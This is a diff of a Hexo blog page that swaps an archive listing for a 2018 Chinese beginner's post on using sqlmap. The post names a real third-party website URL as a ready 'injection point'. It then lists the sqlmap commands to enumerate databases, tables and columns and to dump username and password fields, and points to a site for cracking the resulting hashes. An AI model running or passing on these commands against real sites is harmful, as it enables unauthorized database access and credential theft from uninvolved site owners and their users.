@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="//patoo.top">
-  <title>Archives | WELCOME</title>
+  <title>“关于sqlmap的使用” | WELCOME</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Linux ������">
+  <meta name="description" content="萌新上路，不好勿喷 sqlmap的下载和安装：  将python 2.7安装在c盘，把sqlmap的安装包放在python2.7的文件夹中  打开运行输入cmd  这里我提供供了一个注入点：http://www.dcsp.com.tw/news_detail.php?id=56  然后 ，我们运行指令： sqlmap.py -u http://www.dcsp.com.tw/news_detail">
 <meta name="keywords" content="ǰ��,js,jquery,javascript,html5,������,����Գ,������,����,���,����,��Դ,IT��վ,Developer,Programmer,Coder,Geek,html,css,css3,�û�����">
-<meta property="og:type" content="website">
-<meta property="og:title" content="WELCOME">
-<meta property="og:url" content="//patoo.top/archives/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“关于sqlmap的使用”">
+<meta property="og:url" content="//patoo.top/2018/04/21/“关于sqlmap的使用”/index.html">
 <meta property="og:site_name" content="WELCOME">
-<meta property="og:description" content="Linux ������">
+<meta property="og:description" content="萌新上路，不好勿喷 sqlmap的下载和安装：  将python 2.7安装在c盘，把sqlmap的安装包放在python2.7的文件夹中  打开运行输入cmd  这里我提供供了一个注入点：http://www.dcsp.com.tw/news_detail.php?id=56  然后 ，我们运行指令： sqlmap.py -u http://www.dcsp.com.tw/news_detail">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-04-21T14:13:27.712Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WELCOME">
-<meta name="twitter:description" content="Linux ������">
+<meta name="twitter:title" content="“关于sqlmap的使用”">
+<meta name="twitter:description" content="萌新上路，不好勿喷 sqlmap的下载和安装：  将python 2.7安装在c盘，把sqlmap的安装包放在python2.7的文件夹中  打开运行输入cmd  这里我提供供了一个注入点：http://www.dcsp.com.tw/news_detail.php?id=56  然后 ，我们运行指令： sqlmap.py -u http://www.dcsp.com.tw/news_detail">
   
     <link rel="alternative" href="/atom.xml" title="WELCOME" type="application/atom+xml">
   
@@ -158,238 +159,183 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-“关于sqlmap的使用”" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      “关于sqlmap的使用”
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/21/“关于sqlmap的使用”/" class="archive-article-date">
+
+        
+        <a href="/2018/04/21/“关于sqlmap的使用”/" class="archive-article-date">
   	<time datetime="2018-04-21T04:50:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-21</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/21/“关于sqlmap的使用”/">“关于sqlmap的使用”</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>萌新上路，不好勿喷
+</code></pre><p>sqlmap的下载和安装： </p>
+<p>将python 2.7安装在c盘，把sqlmap的安装包放在python2.7的文件夹中 </p>
+<p>打开运行输入cmd </p>
+<p>这里我提供供了一个注入点：<a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> </p>
+<p>然后 ，我们运行指令： sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> –dbs </p>
+<p>dbs是猜数据库 运行后需要用户输[Y/N],如果懒得打 直接在url后打 –batch 系统会自行选择</p>
+<p>当我们暴出了数据库以后，针对这个数据库进行猜表</p>
+<p>输入命令 ：sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D (数据库） –tables</p>
+<p>当我们得到了用户表以后 输入命令 ：</p>
+<p>sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D （数据库） -T (用户表） –<br>columns </p>
+<p>接着我们对可能存在着用户名和密码的字段进行猜解 -C:指定要暴的字段 –dump:将结果导出</p>
+<p>命令如下:</p>
+<p>sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D （数据库） -T (用户表) -C “username,</p>
+<p>password” –dump</p>
+<p>此时会得到一个md5 或者是windows的加密过的密文我提供了一个免费解密的网站</p>
+<p><a href="http://www.ddosi.com" target="_blank" rel="noopener">http://www.ddosi.com</a> 网站里也有大量的学习资料 在后续我还会继续写其他的注入方式</p>
+<p>主要是关于sqlmap的</p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖糖<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqj7j68lkgj30ff0fsjsu.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fqj7j6ccjnj30j60j10v5.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://patoo.top/2018/04/21/“关于sqlmap的使用”/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/20/“关于vim的使用”/" class="archive-article-date">
-  	<time datetime="2018-04-20T12:02:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-20</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/04/20/“关于vim的使用”/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">“关于vim的使用”</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/20/“关于vim的使用”/">“关于vim的使用”</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/20/“路漫漫其修远兮，吾将上下而求索”/" class="archive-article-date">
-  	<time datetime="2018-04-20T08:32:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/20/“路漫漫其修远兮，吾将上下而求索”/">“路漫漫其修远兮，吾将上下而求索”</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/20/MS08-067/" class="archive-article-date">
-  	<time datetime="2018-04-20T05:21:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/20/MS08-067/">MS08_067</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/19/this-is-my-first-blog-it-s-spendt-me-two-day-to-bulit-it-I-believe-in-the-future-my-blog-will-become-more-and-more-beautiful/" class="archive-article-date">
-  	<time datetime="2018-04-19T00:20:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/19/this-is-my-first-blog-it-s-spendt-me-two-day-to-bulit-it-I-believe-in-the-future-my-blog-will-become-more-and-more-beautiful/">this is my first blog it&#39;s spendt me two day to bulit it.I believe in the future my blog will beco me more and more beautiful</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/19/happily/" class="archive-article-date">
-  	<time datetime="2018-04-19T00:16:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/19/happily/">happily</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/19/the-first-blog/" class="archive-article-date">
-  	<time datetime="2018-04-19T00:15:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/19/the-first-blog/">the first blog</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/19/hello-world/" class="archive-article-date">
-  	<time datetime="2018-04-18T23:18:07.113Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/19/hello-world/">Hello World</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -412,8 +358,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
